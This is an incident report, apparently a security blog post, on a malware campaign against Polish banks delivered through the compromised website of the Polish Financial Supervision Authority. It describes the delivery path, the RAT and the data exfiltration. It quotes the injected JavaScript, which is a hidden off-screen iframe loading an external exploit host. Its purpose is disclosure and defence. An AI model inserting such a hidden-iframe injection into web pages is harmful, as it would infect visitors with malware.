At least a few of\n\nPolish 20-something commercial banks have already con�rmed being victims of\n\na malware infection while others keep looking. Network tra�c to exotic\n\nlocations and encrypted executables nobody recognised on some servers were\n\nthe �rst signs of trouble. A little more than a week ago one of the banks\n\ndetected strange malware present in a few workstations. Having established\n\nbasic indicators of compromise managed to share that information with other\n\nbanks, who started asking their SIEMs for information. In some cases the\n\nresults came back positive.\n\n#### Delivery\n\nPreliminary investigation suggests that the starting point for the infection could\n\nhave been located on the webserver of Polish �nancial sector regulatory body,\n\nPolish Financial Supervision Authority (www.knf.gov.pl). Due to a slight\n\nmodi�cation of one of the local JS �les, an external JS �le was loaded, which\n\ncould have executed malicious payloads on selected targets. This would be really\n\nironic if the website of the key institution responsible for assuring proper\n\nsecurity level in the banking sector was used to attack it.\n\n\n-----\n\n_Current website status is “under maintenance”_\n\n[Data from PassiveTotal does con�rm the �nding related to external resources](https://www.passivetotal.org/search/www.knf.gov.pl)\n\nincluded in knf.gov.pl website since 2016-10-07 till yesterday.\n\nTo unauthorised code was located in the following �le:\n\n\nhttp://www knf gov pl/DefaultDesign/Layouts/KNF2013/resources/accordian\n\n-----\n\nand looked like that:\n\n\ndocument.write(\"<div id='efHpTk' width='0px' height='0px'><iframe\nname='forma' src='https://sap.misapor\n.ch/vishop/view.jsp?pagenum=1' width='145px' height='146px'\nstyle='left:-2144px;position:absolute;top\n:0px;'></iframe></div>\");\n\n\nAfter successful exploitation malware was downloaded to the workstation,\n\nwhere, once executed, connected to some foreign servers and could be used to\n\nperform network reconnaissance, lateral movement and data ex�ltration. At\n\nleast in some cases the attackers managed to gain control over key servers\n\nwithin bank infrastructure.\n\n#### Malware\n\nWhile you can �nd some hashes at the end of this article, we gathered the\n\navailable information regarding the malware itself. While there might be some\n\nelements borrowed from other similar tools and crimeware strategies, the\n\nmalware used in this attack has not been documented before. It uses some\n\ncommercial packers and multiple obfuscation methods, has multiple stages,\n\nrelies on encryption and at the moment of initial analysis was not recognised by\n\navailable AV solutions. The �nal payload has the functionality of a regular RAT.\n\n#### Motivation\n\nWhile we have no idea of attackers motivation, so far we have no knowledge of\n\nany direct �nancial losses incurred by banks or their customers due to this\n\nattack. What is more troubling, some of the victims were able to identify large\n\noutgoing data transfers. So far they could not identify the contents of the data\n\nas it was encrypted. Investigation continues to fully understand the scope of\n\nlosses.\n\n\n-----\n\nWhile this should not come as a surprise, this incident is the perfect example of\n\nthe statement “you are going to get infected”. Polish �nancial sector has some\n\nof the best people and tools in terms of security and still it looks like the\n\nattackers achieved their objectives without major hurdles in at least some cases.\n\nOn the good side – they were detected and once noti�ed banks were able to\n\nquickly identify infected machines and suspicious tra�c patterns. The whole\n\nprocess lacked solid information sharing, but this is a problem know\n\neverywhere.\n\nWe hope to continue investigating this incident and share with you more details\n\nabout the malware itself in the future.
